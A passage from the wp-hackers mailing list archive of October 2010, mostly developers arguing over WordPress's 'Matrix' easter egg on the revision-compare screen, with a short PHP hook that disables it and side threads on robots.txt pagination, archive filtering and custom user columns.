> any.  And I don't foresee it going away.
>
> On Sat, Oct 23, 2010 at 12:48 PM, Alex Hempton-Smith
> <hempsworth at gmail.com>wrote:
>
> > Many people use control panels with their hosts that give one-click
> > installs. It's also present on wordpress.com.
> >
> > -- Alex
> >
> >
> > On Sat, Oct 23, 2010 at 9:43 PM, Ryan Bilesky <rbilesky at gmail.com>
> wrote:
> >
> > > calling it a "frightening easter egg" is a bit overkill, i mean its
> just
> > > plain overkill.  The point of the idea is this, if you manage WP
> installs
> > > for someone, you can add the javascript so they won't ever see it.  IMO
> > > anyone who is able to install and manage WP by there own should have no
> > > problem with that, it would only cause a problem maybe for some
> horribly
> > > non-technical person, like my parents.  In which case there is probably
> > > someone with some technical ability who runs the site handles upgrades,
> > > ect.
> > >
> > > Plus the javascript can be added in via a plugin so really if someone
> > > writes
> > > the plugin its a simple as installing a plugin.
> > >
> > > On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com>
> > wrote:
> > >
> > > > Thanks to the incredible evangelism of WP a relatively new and
> > > > inexperienced web master sets up a WP blog.  It has the "famous
> > 5-minute
> > > > install".  Couldn't be easier.
> > > >
> > > > Then as we saw with the OP, he or one of his users stumbles upon a
> > rather
> > > > frightening easter egg, and he/they become alarmed that they've been
> > > hacked.
> > > >  WP's reputation as a reliable and easy platform is sullied as they
> > spend
> > > > time searching the internet to find a resolution.  Only to find that
> it
> > > was
> > > > "a joke", installed as part of the program from the original bona
> fide
> > > > sources.
> > > >
> > > > Your solution is to suggest they write javascript to disable this?
> > >  Really?
> > > >  How was this person to know about this risk in the first place?  How
> > > many
> > > > more potentially scary and alarming easter eggs do you expect them to
> > > > magically know about and prevent?  What level of Computer Science
> > > expertise
> > > > is required to manage a WP install, beyond the "5-minute install"?
>  And
> > > > isn't your solution like locking the barn door after the horse is
> gone?
> > > >
> > > > ________________________________
> > > > From: Ryan Bilesky <rbilesky at gmail.com>
> > > > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> > > >
> > > > If you don't like the easter egg use javascript to prevent both radio
> > > > buttons for any given revision from being selected at the same time.
> > > > Problem solved.
> > > >
> > > >
> > > >  _______________________________________________
> > > > wp-hackers mailing list
> > > > wp-hackers at lists.automattic.com
> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 7
> Date: Sat, 23 Oct 2010 20:51:20 -0400
> From: Mike Schinkel <mikeschinkel at newclarity.net>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: wp-hackers at lists.automattic.com
> Message-ID: <E084564A-308E-4906-AB5C-313979412BB2 at newclarity.net>
> Content-Type: text/plain; charset=us-ascii
>
> I'm thinking this thread does a good job of illustrating the "Curse of
> Knowledge":
>
>   http://www.nytimes.com/2007/12/30/business/30know.html
>
> (link via Joel Spolsky)
>
> -Mike
>
> On Oct 23, 2010, at 5:29 PM, Ryan Bilesky wrote:
>
> > I wold imagine it is a small group of people who would be confused or
> even
> > scared by it, and those people probably aren't those who host their own
> > website, they are the people who would hire a developer to setup their
> > website.  Now, this is just an assumption but regardless i find the
> easter
> > egg quite amusing and have trigger it on purpose even, and anything short
> of
> > removing it or having it off by default would have the same affect my
> > javascript suggestion would, an effect which I don't believe is much if
> > any.  And I don't foresee it going away.
> >
> > On Sat, Oct 23, 2010 at 12:48 PM, Alex Hempton-Smith
> > <hempsworth at gmail.com>wrote:
> >
> >> Many people use control panels with their hosts that give one-click
> >> installs. It's also present on wordpress.com.
> >>
> >> -- Alex
> >>
> >>
> >> On Sat, Oct 23, 2010 at 9:43 PM, Ryan Bilesky <rbilesky at gmail.com>
> wrote:
> >>
> >>> calling it a "frightening easter egg" is a bit overkill, i mean its
> just
> >>> plain overkill.  The point of the idea is this, if you manage WP
> installs
> >>> for someone, you can add the javascript so they won't ever see it.  IMO
> >>> anyone who is able to install and manage WP by there own should have no
> >>> problem with that, it would only cause a problem maybe for some
> horribly
> >>> non-technical person, like my parents.  In which case there is probably
> >>> someone with some technical ability who runs the site handles upgrades,
> >>> ect.
> >>>
> >>> Plus the javascript can be added in via a plugin so really if someone
> >>> writes
> >>> the plugin its a simple as installing a plugin.
> >>>
> >>> On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com>
> >> wrote:
> >>>
> >>>> Thanks to the incredible evangelism of WP a relatively new and
> >>>> inexperienced web master sets up a WP blog.  It has the "famous
> >> 5-minute
> >>>> install".  Couldn't be easier.
> >>>>
> >>>> Then as we saw with the OP, he or one of his users stumbles upon a
> >> rather
> >>>> frightening easter egg, and he/they become alarmed that they've been
> >>> hacked.
> >>>> WP's reputation as a reliable and easy platform is sullied as they
> >> spend
> >>>> time searching the internet to find a resolution.  Only to find that
> it
> >>> was
> >>>> "a joke", installed as part of the program from the original bona fide
> >>>> sources.
> >>>>
> >>>> Your solution is to suggest they write javascript to disable this?
> >>> Really?
> >>>> How was this person to know about this risk in the first place?  How
> >>> many
> >>>> more potentially scary and alarming easter eggs do you expect them to
> >>>> magically know about and prevent?  What level of Computer Science
> >>> expertise
> >>>> is required to manage a WP install, beyond the "5-minute install"?
>  And
> >>>> isn't your solution like locking the barn door after the horse is
> gone?
> >>>>
> >>>> ________________________________
> >>>> From: Ryan Bilesky <rbilesky at gmail.com>
> >>>> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> >>>>
> >>>> If you don't like the easter egg use javascript to prevent both radio
> >>>> buttons for any given revision from being selected at the same time.
> >>>> Problem solved.
> >>>>
> >>>>
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 69, Issue 49
> ******************************************
>



-- 

Jared Williams
*Web Developer / Designer*
*WPHonors.com <http://2010.wphonors.com> - 2010 WPHonors
*New2WP.com <http://new2wp.com> - Development
Tweeaks.com - Design/Tech

From jeremy at visser.name  Sun Oct 24 12:56:41 2010
From: jeremy at visser.name (Jeremy Visser)
Date: Sun, 24 Oct 2010 23:56:41 +1100
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
Message-ID: <4CC42D09.6070106@visser.name>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Alex Hempton-Smith said:
> Just hook into the <head> with wp_head, and use a conditional statement in
> that function:

Call me old-fashioned, but wouldn't adding this line to robots.txt suffice?

Disallow: /page

(Yes, you'll need to hook into do_robotstxt to add that line, but that's
left as an exercise to the reader.)

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iEYEARECAAYFAkzELQkACgkQvs6Qqs8TxBqbbwCfXUzA9FIvT6OlOd7/KJI2un8/
fZQAoLEXu8pMnEepa/m1xyOtDX0QAOIm
=SbpT
-----END PGP SIGNATURE-----

From hempsworth at gmail.com  Sun Oct 24 12:59:55 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Sun, 24 Oct 2010 14:59:55 +0200
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <4CC42D09.6070106@visser.name>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
	<4CC42D09.6070106@visser.name>
Message-ID: <AANLkTimPU0nV7Y2iesXy=xVt8JPQGDm_8MmqY-i28RhC@mail.gmail.com>

Wow, I didn't even know that existed. Much cleaner way of doing it!

-- Alex


On Sun, Oct 24, 2010 at 2:56 PM, Jeremy Visser <jeremy at visser.name> wrote:

> (Yes, you'll need to hook into do_robotstxt to add that line, but that's
> left as an exercise to the reader.)
>

From steve at sltaylor.co.uk  Sun Oct 24 14:29:24 2010
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Sun, 24 Oct 2010 15:29:24 +0100
Subject: [wp-hackers] wp_get_archives by category and wp.org Ideas
Message-ID: <AANLkTinob0bin7vY0uouHBwE6X8joEWdwoyt_YpmX8P6@mail.gmail.com>

Hi folks,

I'm trawling through the options for filtering wp_get_archives by
category as well as year. It's a popular request and there's a number
of solutions out there.

While?I'm interested in the most recent, elegant solution for this if
anyone wants to chip in, I'm a little more concerned about this:

http://wordpress.org/extend/ideas/topic/implement-wp_get_archivescategory64

Why is this flagged as "implemented"? I thought for a moment maybe
just the Codex hadn't been updated, but the 3.0.1 source shows no such
functionality, and I can't see anything lined up for 3.0.2 or 3.1 on
Trac. Anyone know what's going on?

cheers,

Steve Taylor

From mail at scribu.net  Sun Oct 24 15:59:18 2010
From: mail at scribu.net (scribu)
Date: Sun, 24 Oct 2010 18:59:18 +0300
Subject: [wp-hackers] Showing users post counts for custom post types
In-Reply-To: <AANLkTi=r77_ZMN4hvN9nY62b4rjoThbD1EbgH8tJnb6Y@mail.gmail.com>
References: <AANLkTi=r77_ZMN4hvN9nY62b4rjoThbD1EbgH8tJnb6Y@mail.gmail.com>
Message-ID: <AANLkTimY4qv=5Kaop0FghSHPucOKriy7Z4XNrWo0t4nA@mail.gmail.com>

On Sun, Oct 24, 2010 at 7:25 AM, Jared Williams <jaredwilli at gmail.com>wrote:

> Hi,
>
> I'm trying to figure out how to hook into the users.php manage page to
> create custom columns for showing the number of posts users have for my
> custom post types. I created a trac
> ticket<http://core.trac.wordpress.org/ticket/15200>for this, but
> @nacin explained why it's a job more for a plugin to do
> instead, so I turned here.
>
> I have been unable to find a way to manipulate the output of the users
> table, so I can add custom columns for CPTs post counts for each user. And
> that may have something to do with the question @nacin asked, what would
> the
> post count numbers link to. For the current 'post' post count a user has,
> it
> links to the post manage page, showing all posts for that user
> (edit.php?author=ID#).
>
> If I were to link it somewhere, it would be to
> 'edit.php?post_type=TYPE&author=ID' if that were even somehow possible I
> guess. But I don't even necessarily need to link it to anywhere. I mostly
> want to just show CPT post counts for each person, having 600 users and a
> combined total of 300+ posts across 4 custom post types. Admins are only
> one
> who can submit 'post' posts, so that column in the users page is useless.
>
> Anyone have any tips on hooking into that to do this?
>

First of all, if you're going to be lazy and reply to a thread to open a new
topic (you should send a clean email instead), at least don't quote the old
topic in your message.

Secondly, there's no way to alter an existing column at the moment. The best
you can do is register a new column and unset the one you're trying to
overwrite.

Here's a tutorial I wrote for the posts screen:
http://scribu.net/wordpress/custom-sortable-columns.html

Just ignore the sortable part and replace 'edit-post' with 'users'.

From wp at andrewnacin.com  Sun Oct 24 16:36:10 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sun, 24 Oct 2010 12:36:10 -0400
Subject: [wp-hackers] Showing users post counts for custom post types
In-Reply-To: <AANLkTimY4qv=5Kaop0FghSHPucOKriy7Z4XNrWo0t4nA@mail.gmail.com>
References: <AANLkTi=r77_ZMN4hvN9nY62b4rjoThbD1EbgH8tJnb6Y@mail.gmail.com>
	<AANLkTimY4qv=5Kaop0FghSHPucOKriy7Z4XNrWo0t4nA@mail.gmail.com>
Message-ID: <AANLkTinCtXrJ1HfsXoTB4X4Dp1P+9RCF-wcb_S9wQsC5@mail.gmail.com>

On Sun, Oct 24, 2010 at 11:59 AM, scribu <mail at scribu.net> wrote:

> On Sun, Oct 24, 2010 at 7:25 AM, Jared Williams <jaredwilli at gmail.com
> >wrote:
>
> > Hi,
> >
> > I'm trying to figure out how to hook into the users.php manage page to
> > create custom columns for showing the number of posts users have for my
> > custom post types. I created a trac
> > ticket<http://core.trac.wordpress.org/ticket/15200>for this, but
> > @nacin explained why it's a job more for a plugin to do
> > instead, so I turned here.
> >
> > I have been unable to find a way to manipulate the output of the users
> > table, so I can add custom columns for CPTs post counts for each user.
> And
> > that may have something to do with the question @nacin asked, what would
> > the
> > post count numbers link to. For the current 'post' post count a user has,
> > it
> > links to the post manage page, showing all posts for that user
> > (edit.php?author=ID#).
> >
> > If I were to link it somewhere, it would be to
> > 'edit.php?post_type=TYPE&author=ID' if that were even somehow possible I
> > guess. But I don't even necessarily need to link it to anywhere. I mostly
> > want to just show CPT post counts for each person, having 600 users and a
> > combined total of 300+ posts across 4 custom post types. Admins are only
> > one
> > who can submit 'post' posts, so that column in the users page is useless.
> >
> > Anyone have any tips on hooking into that to do this?
> >
>
> First of all, if you're going to be lazy and reply to a thread to open a
> new
> topic (you should send a clean email instead), at least don't quote the old
> topic in your message.
>
> Secondly, there's no way to alter an existing column at the moment. The
> best
> you can do is register a new column and unset the one you're trying to
> overwrite.
>
> Here's a tutorial I wrote for the posts screen:
> http://scribu.net/wordpress/custom-sortable-columns.html
>
> Just ignore the sortable part and replace 'edit-post' with 'users'.


Of note, that tutorial has some awesome 3.1 bits in it. But the process of
hooking into manage_users_columns etc is all the same. In 3.1, you'll want
to look in the list-table(s) files in wp-admin/includes. In 3.0 you'll want
to look in wp-admin/includes/template.php.

From mail at scribu.net  Sun Oct 24 16:56:35 2010
From: mail at scribu.net (scribu)
Date: Sun, 24 Oct 2010 19:56:35 +0300
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <4CC42D09.6070106@visser.name>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
	<4CC42D09.6070106@visser.name>
Message-ID: <AANLkTinikspuK-nNGD-J=7k+aFiS=LV4=qmwNjErNKgm@mail.gmail.com>

On Sun, Oct 24, 2010 at 3:56 PM, Jeremy Visser <jeremy at visser.name> wrote:

> (Yes, you'll need to hook into do_robotstxt to add that line, but that's
> left as an exercise to the reader.)
>

You only need to do that if you can't create the robots.txt file on your
server.

From chris at clwill.com  Sun Oct 24 17:57:06 2010
From: chris at clwill.com (Chris Williams)
Date: Sun, 24 Oct 2010 13:57:06 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>
Message-ID: <C8E9C182.6427C%chris@clwill.com>

You miss the major point: if I don't know the egg exists, how am I supposed to be prescient enough to install the javascript/plugin?

________________________________
From: Ryan Bilesky <rbilesky at gmail.com>
Subject: Re: [wp-hackers] "The Matrix Has You" easter egg

if you manage WP installs
for someone, you can add the javascript so they won't ever see it.  IMO
anyone who is able to install and manage WP by there own should have no
problem with that, it would only cause a problem maybe for some horribly
non-technical person, like my parents.  In which case there is probably
someone with some technical ability who runs the site handles upgrades, ect.

Plus the javascript can be added in via a plugin so really if someone writes
the plugin its a simple as installing a plugin.

From rbilesky at gmail.com  Sun Oct 24 18:03:55 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Sun, 24 Oct 2010 11:03:55 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8E9C182.6427C%chris@clwill.com>
References: <AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>
	<C8E9C182.6427C%chris@clwill.com>
Message-ID: <AANLkTinEN50Vf7tM1LoiiX5AVKkrzgpFfvT45tgAhNgH@mail.gmail.com>

Well what then do you purpose because its not like its going to get turned
off.

On Sun, Oct 24, 2010 at 10:57 AM, Chris Williams <chris at clwill.com> wrote:

> You miss the major point: if I don't know the egg exists, how am I supposed
> to be prescient enough to install the javascript/plugin?
>
> ________________________________
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> if you manage WP installs
> for someone, you can add the javascript so they won't ever see it.  IMO
> anyone who is able to install and manage WP by there own should have no
> problem with that, it would only cause a problem maybe for some horribly
> non-technical person, like my parents.  In which case there is probably
> someone with some technical ability who runs the site handles upgrades,
> ect.
>
> Plus the javascript can be added in via a plugin so really if someone
> writes
> the plugin its a simple as installing a plugin.
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From chip at chipbennett.net  Sun Oct 24 18:26:30 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Sun, 24 Oct 2010 13:26:30 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTinEN50Vf7tM1LoiiX5AVKkrzgpFfvT45tgAhNgH@mail.gmail.com>
References: <AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>
	<C8E9C182.6427C%chris@clwill.com>
	<AANLkTinEN50Vf7tM1LoiiX5AVKkrzgpFfvT45tgAhNgH@mail.gmail.com>
Message-ID: <AANLkTikLZeD-1sxVLoLHTV5AmTVSfKumWYL=id3y_PtW@mail.gmail.com>

Hmm... it would appear that several things have been proposed - the most
straight-forward being the so-called "lame" approach of providing a simple
wp-config.php variable to disable all easter eggs.

In any case, I find it rather disingenuous - or at least, strange - for
anyone who has followed this particular thread to ask, at this point, "what
do you propose?".

Chip

On Sun, Oct 24, 2010 at 1:03 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> Well what then do you purpose because its not like its going to get turned
> off.
>
> On Sun, Oct 24, 2010 at 10:57 AM, Chris Williams <chris at clwill.com> wrote:
>
> > You miss the major point: if I don't know the egg exists, how am I
> supposed
> > to be prescient enough to install the javascript/plugin?
> >
> > ________________________________
> > From: Ryan Bilesky <rbilesky at gmail.com>
> > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> >
> > if you manage WP installs
> > for someone, you can add the javascript so they won't ever see it.  IMO
> > anyone who is able to install and manage WP by there own should have no
> > problem with that, it would only cause a problem maybe for some horribly
> > non-technical person, like my parents.  In which case there is probably
> > someone with some technical ability who runs the site handles upgrades,
> > ect.
> >
> > Plus the javascript can be added in via a plugin so really if someone
> > writes
> > the plugin its a simple as installing a plugin.
> >  _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From chris at clwill.com  Sun Oct 24 18:53:19 2010
From: chris at clwill.com (Chris Williams)
Date: Sun, 24 Oct 2010 14:53:19 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTinEN50Vf7tM1LoiiX5AVKkrzgpFfvT45tgAhNgH@mail.gmail.com>
Message-ID: <C8E9CEAF.64289%chris@clwill.com>

In order of preference:


 1.  Remove it (and all eggs) entirely.
 2.  Turn it (them) off by default, and require some kind of config to turn it (them) ON.
 3.  Make it (them) MUCH harder to stumble upon, e.g. multiple obscure steps in sequence.

Even the config file option proposed below (and above) requires one to know it exists beforehand.

IMHO, the WP committers need to understand that eggs are detrimental to WP's reputation as a professional-quality tool.

________________________________
From: Ryan Bilesky <rbilesky at gmail.com>
Subject: Re: [wp-hackers] "The Matrix Has You" easter egg

Well what then do you purpose because its not like its going to get turned
off.

From shinji at elite-systems.org  Sun Oct 24 19:00:40 2010
From: shinji at elite-systems.org (Robert Pendell)
Date: Sun, 24 Oct 2010 15:00:40 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8E9CEAF.64289%chris@clwill.com>
References: <AANLkTinEN50Vf7tM1LoiiX5AVKkrzgpFfvT45tgAhNgH@mail.gmail.com>
	<C8E9CEAF.64289%chris@clwill.com>
Message-ID: <AANLkTike6nv7UixqCMv3rs3UggZwFnfrA+NR-Azh7482@mail.gmail.com>

I agree on this.  At this point the existing ones should be removed and new
(but much harder to find) ones should be implemented.

On Oct 24, 2010 2:53 PM, "Chris Williams" <chris at clwill.com> wrote:

In order of preference:


 1.  Remove it (and all eggs) entirely.
 2.  Turn it (them) off by default, and require some kind of config to turn
it (them) ON.
 3.  Make it (them) MUCH harder to stumble upon, e.g. multiple obscure steps
in sequence.

Even the config file option proposed below (and above) requires one to know
it exists beforehand.

IMHO, the WP committers need to understand that eggs are detrimental to WP's
reputation as a professional-quality tool.


________________________________
From: Ryan Bilesky <rbilesky at gmail.com>
Subject: Re: [wp-hackers] ...

Well what then do you purpose because its not like its going to get turned
off.

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic....

From ozh at ozh.org  Sun Oct 24 19:13:54 2010
From: ozh at ozh.org (Ozh)
Date: Sun, 24 Oct 2010 21:13:54 +0200
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTike6nv7UixqCMv3rs3UggZwFnfrA+NR-Azh7482@mail.gmail.com>
References: <AANLkTinEN50Vf7tM1LoiiX5AVKkrzgpFfvT45tgAhNgH@mail.gmail.com>
	<C8E9CEAF.64289%chris@clwill.com>
	<AANLkTike6nv7UixqCMv3rs3UggZwFnfrA+NR-Azh7482@mail.gmail.com>
Message-ID: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>

(you of course all realize this discussion is going nowhere and is
completely useless, right?)

-- 
http://ozh.org/

From chris at clwill.com  Sun Oct 24 19:22:49 2010
From: chris at clwill.com (Chris Williams)
Date: Sun, 24 Oct 2010 15:22:49 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>
Message-ID: <C8E9D599.64295%chris@clwill.com>

I prefer the bikeshed blue... :)

________________________________
From: Ozh <ozh at ozh.org>
Subject: Re: [wp-hackers] "The Matrix Has You" easter egg

(you of course all realize this discussion is going nowhere and is
completely useless, right?)

From steve at sltaylor.co.uk  Sun Oct 24 19:34:28 2010
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Sun, 24 Oct 2010 20:34:28 +0100
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8E9D599.64295%chris@clwill.com>
References: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>
	<C8E9D599.64295%chris@clwill.com>
Message-ID: <AANLkTi=XR=7wDpO0zzvNymbOGT=1bVExkU3YXLaisuq-@mail.gmail.com>

I've been following this thread casually, and I have to admit I'm
perplexed why some people seem so committed to the idea that there's
nothing that can be done about "the Easter eggs" issue.

It seems like a valid concern (if not life-or-death), and proposals
for dealing with it have been pretty reasonable (a wp-config.php
setting turned off by default seems pretty sensible).

Why respond with "there's nothing that can be done" and "this
conversation's going nowhere"? As if WP wasn't an open source project
where the community decide what happens with it? :-\

cheers,

Steve Taylor

From chip at chipbennett.net  Sun Oct 24 19:51:18 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Sun, 24 Oct 2010 14:51:18 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTi=XR=7wDpO0zzvNymbOGT=1bVExkU3YXLaisuq-@mail.gmail.com>
References: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>
	<C8E9D599.64295%chris@clwill.com>
	<AANLkTi=XR=7wDpO0zzvNymbOGT=1bVExkU3YXLaisuq-@mail.gmail.com>
Message-ID: <AANLkTik5u275zeXXyTL9tSHy2vqkRDKjSo+eBugjFvUa@mail.gmail.com>

On Sun, Oct 24, 2010 at 2:34 PM, Steve Taylor <steve at sltaylor.co.uk> wrote:
>
> Why respond with "there's nothing that can be done" and "this
> conversation's going nowhere"? *As if WP wasn't an open source project
> where the community decide what happens with it? :-\*
>
> Because, at the end of the day: it isn't; the community doesn't decide.

Some have made peace with this reality, and have figured out how to work
within the system. Others still haven't, and continue to be frustrated by
it.

Chip

From eric at eam.me  Sun Oct 24 21:24:34 2010
From: eric at eam.me (Eric Mann)
Date: Sun, 24 Oct 2010 14:24:34 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTik5u275zeXXyTL9tSHy2vqkRDKjSo+eBugjFvUa@mail.gmail.com>
References: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>
	<C8E9D599.64295%chris@clwill.com>
	<AANLkTi=XR=7wDpO0zzvNymbOGT=1bVExkU3YXLaisuq-@mail.gmail.com>
	<AANLkTik5u275zeXXyTL9tSHy2vqkRDKjSo+eBugjFvUa@mail.gmail.com>
Message-ID: <AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>

For the sake of argument, I prefer a red bikeshed :-)

I didn't expect this much of an uproar to my initial email.  Really, I just
wanted a simple way to turn off an easter egg that might confuse some of my
needier clients - you know, the kinds of people who know how to use
one-click installers supplied by web hosts, know how to turn their computers
on and off, but still type "Facebook Login" into a Google search rather than
going directly to "facebook.com."

In actuality, Otto's original suggestion of just hooking in to
`admin_action_diff` does just about everything I need.

What I'll do is hook in, check to see if we're comparing a post to itself
and, if we are, display an error message informing the user of that fact and
directing them back to the post editor:

function prevent_matrix_easter_egg() {
    $left = empty( $_POST['left'] ) ? ( empty( $_GET['left'] ) ? '' :
$_GET['left'] ) : $_POST['left'];
    $right = empty( $_POST['right'] ) ? ( empty( $_GET['right'] ) ? '' :
$_GET['right'] ) : $_POST['right'];

    if($left == $right) {
        $redirect = get_edit_post_link( $left );
        wp_die("Error: Cannot compare a revision to itself.<br /><a href=\""
. $redirect . "\">Go Back</a>");
    }
}
add_action('admin_action_diff', 'prevent_matrix_easter_egg');

This doesn't attempt to answer the "to create easter eggs" or "not to create
easter eggs" debate that's resurfaced.  The fact of the matter is that I
personally enjoy easter eggs and, really, most people do, too.  But there
will always be one or two people completely befuddled by the cool
animations, videos, and popups that define our practical jokes.  Whenever we
create an easter egg, we should keep those people in mind and have a simple
way to turn them off.

For the capital P feature (I only mention this because someone else brought
it up) you can add a filter to turn of the feature.  Now, you can add an
action to disable the Matrix easter egg as well.  It's a bit heaver than a
`remove_action` tag, but it's still not too technical.

For the sake of argument, why don't we come up with a list of these
"additional" features that developers might need to turn off for clients,
bundle the code into a drop-in (as opposed to a plug-in), and allow
developers who need it to just deploy it on their sites?

FWIW I think the easter eggs should stay.  They make WordPress fun, add
character, and prove that we have a sense of humor as a community.

~Eric

On Sun, Oct 24, 2010 at 12:51 PM, Chip Bennett <chip at chipbennett.net> wrote:

> On Sun, Oct 24, 2010 at 2:34 PM, Steve Taylor <steve at sltaylor.co.uk>
> wrote:
> >
> > Why respond with "there's nothing that can be done" and "this
> > conversation's going nowhere"? *As if WP wasn't an open source project
> > where the community decide what happens with it? :-\*
> >
> > Because, at the end of the day: it isn't; the community doesn't decide.
>
> Some have made peace with this reality, and have figured out how to work
> within the system. Others still haven't, and continue to be frustrated by
> it.
>
> Chip
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mail at scribu.net  Sun Oct 24 22:00:11 2010
From: mail at scribu.net (scribu)
Date: Mon, 25 Oct 2010 01:00:11 +0300
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>
References: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>
	<C8E9D599.64295%chris@clwill.com>
	<AANLkTi=XR=7wDpO0zzvNymbOGT=1bVExkU3YXLaisuq-@mail.gmail.com>
	<AANLkTik5u275zeXXyTL9tSHy2vqkRDKjSo+eBugjFvUa@mail.gmail.com>
	<AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>
Message-ID: <AANLkTi=f-iXhJr8-ZVSiWrx4jJwBpxe9FiySDhgdqwgH@mail.gmail.com>

On Mon, Oct 25, 2010 at 12:24 AM, Eric Mann <eric at eam.me> wrote:

> For the sake of argument, why don't we come up with a list of these
> "additional" features that developers might need to turn off for clients,
> bundle the code into a drop-in (as opposed to a plug-in), and allow
> developers who need it to just deploy it on their sites?
>

I think putting it in the mu-plugins folder would be just as godd, with the
added benefit of no Core modifications required.


Why respond with "there's nothing that can be done" and "this
> conversation's going nowhere"? As if WP wasn't an open source project
> where the community decide what happens with it? :-\
>

Just because it's open source doesn't mean it's a democracy.

WP is a meritocracy. In other words, some voices weigh heavier than others,
based on their previous contributions to the project.

From otto at ottodestruct.com  Sun Oct 24 23:19:38 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 24 Oct 2010 18:19:38 -0500
